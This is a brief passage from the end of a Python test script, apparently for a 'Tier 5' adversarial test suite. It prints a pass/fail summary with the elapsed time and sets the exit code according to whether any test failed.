    print(f"Tier 5 Adversarial Summary: {passed} passed, {failed} failed in {elapsed:.2f}s")
    print("======================================================================")

    if failed > 0:
        sys.exit(1)
    sys.exit(0)
